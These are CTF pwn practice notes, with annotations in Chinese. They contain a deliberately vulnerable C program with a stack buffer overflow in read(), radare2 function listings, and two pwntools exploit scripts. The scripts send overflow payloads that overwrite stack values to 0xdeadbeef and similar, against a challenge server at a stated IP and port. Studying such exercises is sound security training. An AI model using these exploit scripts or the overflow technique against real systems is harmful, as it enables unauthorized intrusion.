
#
```


```

# 1
```
#include"stdio.h"
#include"stdlib.h"

void printTheKey(){
  /*
   *
   * print the key
   *
   */
}

int main(){
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  
  int token = 1234; <===存在buffer <==>  stack
  char key[16];   <===array 存在buffer <==>  stack

  printf("Billy left his key in the locked room.\n");
  printf("However, he forgot the token of the room.\n");
  printf("Do you know what's the key?");

  read(0, key, 40); ==>  可以buffer overflow
  
//https://man7.org/linux/man-pages/man2/read.2.html

  if((int)token == 0xdeadbeef){
    printf("Door open. OwO\n");
    printTheKey();
    system("cat /home/ctf/flag");
  }else{
    printf("Cannot open door. QwQ\n");
  }

  return 0;
}
```

# 逆向
```
r2 pass
[0x004005d0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x004005d0]> afl
0x00400528    3 26           sym._init
0x00400560    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.system
0x00400580    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x004005a0    1 6            sym.imp.__libc_start_main
0x004005b0    1 6            sym.imp.setvbuf
0x004005c0    1 6            fcn.004005c0
0x004005d0    1 41           entry0
0x00400600    4 50   -> 41   sym.deregister_tm_clones
0x00400640    4 58   -> 55   sym.register_tm_clones
0x00400680    3 28           sym.__do_global_dtors_aux
0x004006a0    4 38   -> 35   entry.init0
0x004006c6    7 328          sym.printTheKey
0x0040080e    4 195          main
0x004008e0    4 101          sym.__libc_csu_init
0x00400950    1 2            sym.__libc_csu_fini
0x00400954    1 9            sym._fini

```

#
```

# nc 120.114.62.213 6125
from pwn import *

#r = process('./pass')
r = remote('120.114.62.213', 6125)

payload = b'A'*28

r.sendline(payload + p64(0xdeadbeef))

r.interactive()
```


# Level 2 2-1.張元_Pwn-1
```
# nc 120.114.62.213 2111
#!/usr/bin/env python

from pwn import *

host , port = '120.114.62.213' , 2111
y = remote( host , port )

y.send( 'D' * 0xc + p32( 0xfaceb00c ) + p32( 0xdeadbeef ) + p32( 0x7 ) )
y.sendline( '7' )

sleep(1)
y.interactive()
```
